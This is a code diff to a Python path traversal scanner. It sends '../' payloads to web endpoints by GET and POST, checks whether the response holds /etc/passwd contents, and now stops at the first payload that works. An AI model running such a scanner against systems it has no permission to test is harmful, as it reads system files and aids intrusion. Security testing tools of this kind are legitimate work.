@@ -31,7 +31,13 @@ def send_get_request(link, soup, payloads):
     full_link = link + payload
     print("Trying get request {}".format(full_link))
     response = requests.get(full_link)
-    print("Exploitable with payload {}: {}\n".format(payload, contains_passwd(response)))
+    is_exploitable = contains_passwd(response)
+    print("Exploitable with payload {}: {}\n".format(payload, is_exploitable))
+
+    # stop after finding the first payload that can be used to exploit the endpt
+    # because if can be exploited with ../../ then for sure can be exploited with ../../../
+    if is_exploitable:
+        break
 
 def send_post_request(link, soup, payloads):
   """Try payloads in a post request"""
@@ -43,8 +49,13 @@ def send_post_request(link, soup, payloads):
 
     print("Trying post request {}".format(link))
     response = requests.post(link, data = {'key':payload})
-    print(response.text)
-    print("Exploitable with payload {}: {}\n".format(payload, contains_passwd(response)))
+    is_exploitable = contains_passwd(response)
+    print("Exploitable with payload {}: {}\n".format(payload, is_exploitable))
+
+    # stop after finding the first payload that can be used to exploit the endpt
+    # because if can be exploited with ../../ then for sure can be exploited with ../../../
+    if is_exploitable:
+        break
 
 def contains_passwd(response):
   """Checks if reponse constains /etc/passwd contents
